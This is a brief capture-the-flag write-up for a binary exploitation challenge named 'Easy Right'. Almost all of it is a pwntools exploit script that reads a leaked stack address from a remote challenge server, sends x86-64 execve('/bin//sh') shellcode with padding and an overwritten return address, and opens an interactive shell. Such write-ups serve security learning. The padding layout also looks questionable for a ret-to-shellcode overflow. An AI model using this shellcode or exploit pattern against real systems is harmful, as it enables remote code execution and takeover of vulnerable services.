# Easy Right 150 pts(61 solves) #
![TASK](https://imgur.com/KPAwfTa.png)

It was a simple Ret to shellcode task,and we are given a leak of the stack address , here is my exploit 

```python

from pwn import *
p=remote("142.93.113.134",9999)
#p=process("./baby")
data=p.recvline()
stack=int("0x"+data[-13:],16)
log.info("Stack address: "+hex(stack))
#pause()
shellcode="\x90\x90\x90\x90\x90\x90\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
OFFSET=cyclic(100)
payload=shellcode
payload+=OFFSET
payload+=p64(stack)
p.sendline(payload)
p.interactive()

```
**Note:** Here is the link of the binary [HERE]()
Any questions you can DM on twitter @BelkahlaAhmed1 , thank you :D
